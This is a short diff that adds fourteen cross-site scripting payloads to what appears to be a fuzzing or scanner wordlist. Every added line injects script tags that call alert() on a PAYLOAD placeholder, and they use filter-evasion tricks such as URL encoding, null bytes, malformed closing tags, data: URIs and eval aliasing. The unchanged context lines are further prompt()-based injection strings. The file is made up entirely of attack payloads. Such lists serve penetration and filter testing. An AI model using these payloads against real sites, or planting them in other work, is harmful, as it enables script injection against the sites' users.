@@ -1,3 +1,17 @@
+Y#<script>alert('PAYLOAD')</script>
+Y#<%<!--'%><script>alert(PAYLOAD);</script -->
+Y#<script ^__^>alert(PAYLOAD)</script ^__^
+Y#<script src="data:text/javascript,alert(PAYLOAD)"></script>
+Y#<script>+-+-1-+-+alert(PAYLOAD)</script>
+Y#<script x> alert(PAYLOAD) </script 1=2
+Y#<script>a=eval;b=alert;a(b(/ PAYLOAD/.source));</script>'">
+Y#<script/y~~~>;alert(PAYLOAD);</script/Y~~~>
+Y#%00“><script>alert(PAYLOAD)</script>
+Y#%22%3E%3Cscript%3Ealert(PAYLOAD)%3B%3C%2Fscript%3E
+Y#%3Cscript%3Ealert(PAYLOAD)%3B%3C%2Fscript%3E
+Y#`"><%3Cscript>javascript:alert(PAYLOAD)</script>
+Y#%3Cscript>javascript:alert(PAYLOAD)</script>
+Y#<SCRIPT>a=/PAYLOAD/alert(a.source)</SCRIPT>
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
